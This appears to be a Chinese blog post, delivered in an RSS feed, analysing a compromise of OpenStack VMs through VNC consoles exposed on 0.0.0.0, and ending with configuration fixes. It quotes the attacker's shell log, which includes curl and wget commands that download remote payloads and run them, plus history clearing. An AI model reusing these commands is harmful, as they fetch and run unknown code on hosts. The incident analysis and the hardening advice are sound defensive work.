<link>http://www.cnblogs.com/yaohong/p/8417639.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yaohong/p/8417639.html</guid>
<description>&lt;h2&gt;一：问题定位&lt;/h2&gt;
&lt;p&gt;现象：&lt;/p&gt;
&lt;p&gt;　　近期发现有几台openstack云主机被修改密码并被肉鸡。&lt;/p&gt;
&lt;p&gt;黑客操作日志：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;18&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;01&lt;/span&gt; &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;41&lt;/span&gt;:&lt;span&gt;26&lt;/span&gt; ##### root tty1 &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;41&lt;/span&gt;  #### &lt;span&gt;2018&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;01&lt;/span&gt; &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;41&lt;/span&gt;:&lt;span&gt;13&lt;/span&gt;&lt;span&gt; top
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;01&lt;/span&gt; &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;41&lt;/span&gt;:&lt;span&gt;26&lt;/span&gt; ##### root tty1 &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;41&lt;/span&gt;  #### &lt;span&gt;2018&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;01&lt;/span&gt; &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;41&lt;/span&gt;:&lt;span&gt;26&lt;/span&gt;&lt;span&gt; clear
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;01&lt;/span&gt; &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;41&lt;/span&gt;:&lt;span&gt;33&lt;/span&gt; ##### root tty1 &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;41&lt;/span&gt;  #### &lt;span&gt;2018&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;01&lt;/span&gt; &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;41&lt;/span&gt;:&lt;span&gt;33&lt;/span&gt; nvidia-&lt;span&gt;smi
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;01&lt;/span&gt; &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;41&lt;/span&gt;:&lt;span&gt;42&lt;/span&gt; ##### root tty1 &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;41&lt;/span&gt;  #### &lt;span&gt;2018&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;01&lt;/span&gt; &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;41&lt;/span&gt;:&lt;span&gt;42&lt;/span&gt; cd /&lt;span&gt;opt
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;01&lt;/span&gt; &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;41&lt;/span&gt;:&lt;span&gt;42&lt;/span&gt; ##### root tty1 &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;41&lt;/span&gt;  #### &lt;span&gt;2018&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;01&lt;/span&gt; &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;41&lt;/span&gt;:&lt;span&gt;42&lt;/span&gt;&lt;span&gt; ls
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;01&lt;/span&gt; &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;41&lt;/span&gt;:&lt;span&gt;45&lt;/span&gt; ##### root tty1 &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;41&lt;/span&gt;  #### &lt;span&gt;2018&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;01&lt;/span&gt; &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;41&lt;/span&gt;:&lt;span&gt;45&lt;/span&gt; ls -&lt;span&gt;a
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;01&lt;/span&gt; &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;42&lt;/span&gt;:&lt;span&gt;09&lt;/span&gt; ##### root tty1 &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;41&lt;/span&gt;  #### &lt;span&gt;2018&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;01&lt;/span&gt; &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;41&lt;/span&gt;:&lt;span&gt;58&lt;/span&gt; curl 666y.atwebpages.com/yamit.txt -o yamit &amp;amp;&amp;amp; chmod +x yamit &amp;amp;&amp;amp;./&lt;span&gt;yamit
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;01&lt;/span&gt; &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;42&lt;/span&gt;:&lt;span&gt;12&lt;/span&gt; ##### root tty1 &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;41&lt;/span&gt;  #### &lt;span&gt;2018&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;01&lt;/span&gt; &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;42&lt;/span&gt;:&lt;span&gt;12&lt;/span&gt;&lt;span&gt; ls
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;01&lt;/span&gt; &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;42&lt;/span&gt;:&lt;span&gt;20&lt;/span&gt; ##### root tty1 &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;41&lt;/span&gt;  #### &lt;span&gt;2018&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;01&lt;/span&gt; &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;42&lt;/span&gt;:&lt;span&gt;20&lt;/span&gt;&lt;span&gt; cat yamit
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;01&lt;/span&gt; &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;42&lt;/span&gt;:&lt;span&gt;29&lt;/span&gt; ##### root tty1 &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;41&lt;/span&gt;  #### &lt;span&gt;2018&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;01&lt;/span&gt; &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;42&lt;/span&gt;:&lt;span&gt;29&lt;/span&gt; histoy -&lt;span&gt;c
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;01&lt;/span&gt; &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;42&lt;/span&gt;:&lt;span&gt;31&lt;/span&gt; ##### root tty1 &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;41&lt;/span&gt;&lt;span&gt;  ####
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;01&lt;/span&gt; &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;42&lt;/span&gt;:&lt;span&gt;33&lt;/span&gt; ##### root tty1 &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;41&lt;/span&gt;  #### &lt;span&gt;2018&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;01&lt;/span&gt; &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;42&lt;/span&gt;:&lt;span&gt;33&lt;/span&gt; rm -&lt;span&gt;rf yamit
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;01&lt;/span&gt; &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;42&lt;/span&gt;:&lt;span&gt;40&lt;/span&gt; ##### root tty1 &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;41&lt;/span&gt;  #### &lt;span&gt;2018&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;01&lt;/span&gt; &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;42&lt;/span&gt;:&lt;span&gt;35&lt;/span&gt;&lt;span&gt; top
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;01&lt;/span&gt; &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;42&lt;/span&gt;:&lt;span&gt;40&lt;/span&gt; ##### root tty1 &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;41&lt;/span&gt;  #### &lt;span&gt;2018&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;01&lt;/span&gt; &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;42&lt;/span&gt;:&lt;span&gt;40&lt;/span&gt;&lt;span&gt; ear
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;01&lt;/span&gt; &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;42&lt;/span&gt;:&lt;span&gt;42&lt;/span&gt; ##### root tty1 &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;41&lt;/span&gt;&lt;span&gt;  ####
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;01&lt;/span&gt; &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;43&lt;/span&gt;:&lt;span&gt;09&lt;/span&gt; ##### root tty1 &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;43&lt;/span&gt;  #### &lt;span&gt;2018&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;01&lt;/span&gt; &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;42&lt;/span&gt;:&lt;span&gt;45&lt;/span&gt;&lt;span&gt; exit
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;01&lt;/span&gt; &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;43&lt;/span&gt;:&lt;span&gt;11&lt;/span&gt; ##### root tty1 &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;43&lt;/span&gt;  #### &lt;span&gt;2018&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;01&lt;/span&gt; &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;43&lt;/span&gt;:&lt;span&gt;11&lt;/span&gt;&lt;span&gt; clear
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;03&lt;/span&gt; &lt;span&gt;03&lt;/span&gt;:&lt;span&gt;56&lt;/span&gt;:&lt;span&gt;25&lt;/span&gt; ##### root tty1 &lt;span&gt;03&lt;/span&gt;:&lt;span&gt;56&lt;/span&gt;  #### &lt;span&gt;2018&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;01&lt;/span&gt; &lt;span&gt;22&lt;/span&gt;:&lt;span&gt;43&lt;/span&gt;:&lt;span&gt;12&lt;/span&gt;&lt;span&gt; exit
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;03&lt;/span&gt; &lt;span&gt;03&lt;/span&gt;:&lt;span&gt;56&lt;/span&gt;:&lt;span&gt;28&lt;/span&gt; ##### root tty1 &lt;span&gt;03&lt;/span&gt;:&lt;span&gt;56&lt;/span&gt;  #### &lt;span&gt;2018&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;03&lt;/span&gt; &lt;span&gt;03&lt;/span&gt;:&lt;span&gt;56&lt;/span&gt;:&lt;span&gt;28&lt;/span&gt;&lt;span&gt; ifconfig
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;03&lt;/span&gt; &lt;span&gt;03&lt;/span&gt;:&lt;span&gt;56&lt;/span&gt;:&lt;span&gt;44&lt;/span&gt; ##### root tty1 &lt;span&gt;03&lt;/span&gt;:&lt;span&gt;56&lt;/span&gt;  #### &lt;span&gt;2018&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;03&lt;/span&gt; &lt;span&gt;03&lt;/span&gt;:&lt;span&gt;56&lt;/span&gt;:&lt;span&gt;42&lt;/span&gt;&lt;span&gt; ping ya.ru
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;03&lt;/span&gt; &lt;span&gt;03&lt;/span&gt;:&lt;span&gt;57&lt;/span&gt;:&lt;span&gt;01&lt;/span&gt; ##### root tty1 &lt;span&gt;03&lt;/span&gt;:&lt;span&gt;56&lt;/span&gt;  #### &lt;span&gt;2018&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;03&lt;/span&gt; &lt;span&gt;03&lt;/span&gt;:&lt;span&gt;57&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt; wget https:&lt;span&gt;//&lt;/span&gt;&lt;span&gt;pastebin.com/raw/BZk9zRE2&lt;/span&gt;
&lt;span&gt;18&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;03&lt;/span&gt; &lt;span&gt;03&lt;/span&gt;:&lt;span&gt;57&lt;/span&gt;:&lt;span&gt;04&lt;/span&gt; ##### root tty1 &lt;span&gt;03&lt;/span&gt;:&lt;span&gt;56&lt;/span&gt;  #### &lt;span&gt;2018&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;03&lt;/span&gt; &lt;span&gt;03&lt;/span&gt;:&lt;span&gt;57&lt;/span&gt;:&lt;span&gt;04&lt;/span&gt;&lt;span&gt; bash B
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;03&lt;/span&gt; &lt;span&gt;03&lt;/span&gt;:&lt;span&gt;57&lt;/span&gt;:&lt;span&gt;31&lt;/span&gt; ##### root tty1 &lt;span&gt;03&lt;/span&gt;:&lt;span&gt;56&lt;/span&gt;  #### &lt;span&gt;2018&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;03&lt;/span&gt; &lt;span&gt;03&lt;/span&gt;:&lt;span&gt;57&lt;/span&gt;:&lt;span&gt;06&lt;/span&gt;&lt;span&gt; bash BZk9zRE2
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;03&lt;/span&gt; &lt;span&gt;03&lt;/span&gt;:&lt;span&gt;57&lt;/span&gt;:&lt;span&gt;38&lt;/span&gt; ##### root tty1 &lt;span&gt;03&lt;/span&gt;:&lt;span&gt;56&lt;/span&gt;  #### &lt;span&gt;2018&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;03&lt;/span&gt; &lt;span&gt;03&lt;/span&gt;:&lt;span&gt;57&lt;/span&gt;:&lt;span&gt;38&lt;/span&gt;&lt;span&gt; rm BZk9zRE2
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;03&lt;/span&gt; &lt;span&gt;03&lt;/span&gt;:&lt;span&gt;57&lt;/span&gt;:&lt;span&gt;42&lt;/span&gt; ##### root tty1 &lt;span&gt;03&lt;/span&gt;:&lt;span&gt;56&lt;/span&gt;  #### &lt;span&gt;2018&lt;/span&gt;-&lt;span&gt;02&lt;/span&gt;-&lt;span&gt;03&lt;/span&gt; &lt;span&gt;03&lt;/span&gt;:&lt;span&gt;57&lt;/span&gt;:&lt;span&gt;42&lt;/span&gt; history =c
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 登陆方式不是通过暴力破解的方式进行登陆此机器，同时看日志看到登陆前有重启虚拟机的行为。&lt;/p&gt;
&lt;p&gt;根据重启日志，应该是黑客通过某种方式重启 OpenStack 中的虚拟机，目前有以下几种方式&lt;/p&gt;
&lt;p&gt;　　1.有权限登陆 OpenStack 物理机，在物理机上操作虚拟机[排除--根据操作日志]&lt;/p&gt;
&lt;p&gt;　　2.有权限登陆 OpenStack dashboard，然后界面上 VNC 操作虚拟机[排除--根据 web 界面重启日志]&lt;/p&gt;
&lt;p&gt;　　3.使用 VNC 客户端直接操作 OpenStack 中的虚拟机&lt;/p&gt;
&lt;p&gt;根据以上方法，确认是以 VNC 客户端直接操作 OpenStack 中的虚拟机导致。&lt;/p&gt;
&lt;h2&gt;二：处理方法&lt;/h2&gt;
&lt;h3&gt;2.1VNC&lt;/h3&gt;
&lt;p&gt;       VNC (Virtual Network Computer) 是虚拟网络计算机的缩写&lt;/p&gt;
&lt;h3&gt;2 .2用 VNC 客户端查看 openstack 创建的虚拟机&lt;/h3&gt;
&lt;p&gt;　　在云计算的环境中，实际上更多的时候是使用 VNC 工具去查看云系统中的 VM。以下记录如何查看的方法：&lt;/p&gt;
&lt;p&gt;　　计算节点查看虚拟机的 ID(libvird 的，非 instanc_id)&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
[root@compute1 ~]# virsh list --&lt;span&gt;all
Id Name State
&lt;/span&gt;----------------------------------------------------
&lt;span&gt;51&lt;/span&gt; instance-&lt;span&gt;000000b7 running
&lt;/span&gt;&lt;span&gt;63&lt;/span&gt; instance-&lt;span&gt;000000d3 running
&lt;/span&gt;&lt;span&gt;64&lt;/span&gt; instance-&lt;span&gt;000000de running#############比如这台
&lt;/span&gt;- instance-&lt;span&gt;000000ac shut off
&lt;/span&gt;- instance-&lt;span&gt;000000b2 shut off
&lt;/span&gt;- instance-&lt;span&gt;000000b3 shut off
&lt;/span&gt;- instance-000000bb shut off
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;       找到需要连接的虚拟机的 ID 号，查看其中暴露的端口：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
[root@compute1 ~]# virsh vncdisplay &lt;span&gt;64&lt;/span&gt;&lt;span&gt;
:&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　然后在 VNC 查看工具中输入相关连接：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;　　在 VNC 客户端上输入 对应的计算节点 IP:1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;　　点击 Connect 后就可以连接上 openstack 创建的虚拟机。&lt;/p&gt;
&lt;p&gt;【备注】以上采用的方法，实际是直接连接的底层的 libvirt，本质上和上层的 openstack 无太大关系，因此也可以用于其它平台。&lt;/p&gt;

&lt;h3&gt;2.3 查看外网可以连接的实例&lt;/h3&gt;
&lt;p&gt;root 权限登陆计算节点后&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;#netstat -tanp | grep kvm | grep LISTEN
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;输出的内容中，监听地址为&lt;code&gt;0.0.0.0&lt;/code&gt;的，都可以外网直接访问此实例&lt;/p&gt;
&lt;h2&gt;3 OpenStack 中 VNC 分析&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/BillWang139967/openstack_install/raw/master/doc/images/principle/nova_vnc.png?raw=true&quot; alt=&quot;nova_vnc&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;3.1 VNC Proxy 的功能&lt;/h3&gt;
&lt;p&gt;　　将公网 (public network) 和私网 (private network) 隔离&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;VNC client 运行在公网上，VNCServer 运行在私网上，VNC Proxy 作为中间的桥梁将二者连接起来&lt;/li&gt;
&lt;li&gt;VNC Proxy 通过 token 对 VNC Client 进行验证&lt;/li&gt;
&lt;li&gt;VNC Proxy 不仅仅使得私网的访问更加安全，而且将具体的 VNC Server 的实现分离，可以支持不同 Hypervisor 的 VNC Server 但不影响用户体验&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;h3&gt;3.2 VNC Proxy 的运行过程&lt;/h3&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;(01) 一个用户试图从浏览器里面打开连接到虚拟机的 VNC Client&lt;/li&gt;
&lt;li&gt;(02) 浏览器向 nova-api 发送请求，要求返回访问 vnc 的 url&lt;/li&gt;
&lt;li&gt;(03) nova-api 调用 nova-compute 的 get vnc console 方法，要求返回连接 VNC 的信息&lt;/li&gt;
&lt;li&gt;(04) nova-compute 调用 libvirt 的 get vnc console 函数&lt;/li&gt;
&lt;li&gt;(05) libvirt 会通过解析虚拟机运行的 /etc/libvirt/qemu/instance-0000000c.xml 文件来获得 VNC Server 的信息&lt;/li&gt;
&lt;li&gt;(06) libvirt 将 host, port 等信息以 json 格式返回给 nova-compute&lt;/li&gt;
&lt;li&gt;(07) nova-compute 会随机生成一个 UUID 作为 Token&lt;/li&gt;
&lt;li&gt;(08) nova-compute 将 libvirt 返回的信息以及配置文件中的信息综合成 connect_info 返回给 nova-api&lt;/li&gt;
&lt;li&gt;(09) nova-api 会调用 nova-consoleauth 的 authorize_console 函数&lt;/li&gt;
&lt;li&gt;(10) nova-consoleauth 会将 instance –&amp;gt; token, token –&amp;gt; connect_info 的信息 cache 起来&lt;/li&gt;
&lt;li&gt;(11) nova-api 将 connect_info 中的 access url 信息返回给浏览器：&lt;a href=&quot;http://172.24.1.1:6080/vnc_auto.html?token=7efaee3f-eada-4731-a87c-e173cbd25e98&amp;amp;title=helloworld%289169fdb2-5b74-46b1-9803-60d2926bd97c%29&quot; rel=&quot;nofollow&quot;&gt;http://172.24.1.1:6080/vnc_auto.html?token=7efaee3f-eada-4731-a87c-e173cbd25e98&amp;amp;title=helloworld%289169fdb2-5b74-46b1-9803-60d2926bd97c%29&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;(12) 浏览器会试图打开这个链接&lt;/li&gt;
&lt;li&gt;(13) 这个链接会将请求发送给 nova-novncproxy&lt;/li&gt;
&lt;li&gt;(14) nova-novncproxy 调用 nova-consoleauth 的 check_token 函数&lt;/li&gt;
&lt;li&gt;(15) nova-consoleauth 验证了这个 token，将这个 instance 对应的 connect_info 返回给 nova-novncproxy&lt;/li&gt;
&lt;li&gt;(16) nova-novncproxy 通过 connect_info 中的 host, port 等信息，连接 compute 节点上的 VNC Server，从而开始了 proxy 的工作&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;h3&gt;3.3 NOVA 中 VNC 相关配置&lt;/h3&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;vnc_enabled=True 启用虚拟机的 VNC 功能。&lt;/li&gt;
&lt;li&gt;vncserver_listen=0.0.0.0
&lt;ul&gt;&lt;li&gt;127.0.0.1(默认)，即只可以从本机进行访问,缺点是浏览器 VNC 访问实例也会失败&lt;/li&gt;
&lt;li&gt;管理网的 IP 地址&lt;/li&gt;
&lt;li&gt;0.0.0.0 主要是考虑到动态迁移时，目的宿主机没有相应的 IP 地址，动态迁移会失败。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;vncserver_proxyclient_address 该地址指明 vnc proxy 应该通过那个 IP 地址来连接 vncserver，通常是管理网 IP 地址。&lt;/li&gt;
&lt;li&gt;novncproxy_base_url=&lt;a href=&quot;http://servicehost:6080/vncauto.html&quot; rel=&quot;nofollow&quot;&gt;http://SERVICEHOST:6080/vncauto.html&lt;/a&gt; 指定浏览器 client 应该连接的地址。&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;p&gt;　　如果 OpenStack 平台架设在公网上,则 vncserver_listen 需要配置为管理网的 IP 地址，否则设置为 &lt;code&gt;0.0.0.0&lt;/code&gt; 就会使得外网用户可以直接访问虚拟机，非常危险&lt;/p&gt;
&lt;h3&gt;3.4 重新设置监听地址后老实例的处理方法&lt;/h3&gt;
&lt;p&gt;　　计算几点重新设置监听地址后(如从&lt;code&gt;0.0.0.0&lt;/code&gt;,修改为计算节点管理网段的 IP)，老的实例的对外的 VNC 仍然是 &lt;code&gt;0.0.0.0&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;　　那是因为 &lt;code&gt;/etc/libvirt/qemu/instance-000000xx.xml&lt;/code&gt; 中配置的监听地址没有变化&lt;/p&gt;
&lt;p&gt;　　可以通过硬重启实例使之(老实例)生效&lt;/p&gt;

</description>
<pubDate>Wed, 07 Feb 2018 09:21:00 +0000</pubDate>
<dc:creator>姚红</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/yaohong/p/8417639.html</dc:identifier>
</item>
</channel>
</rss>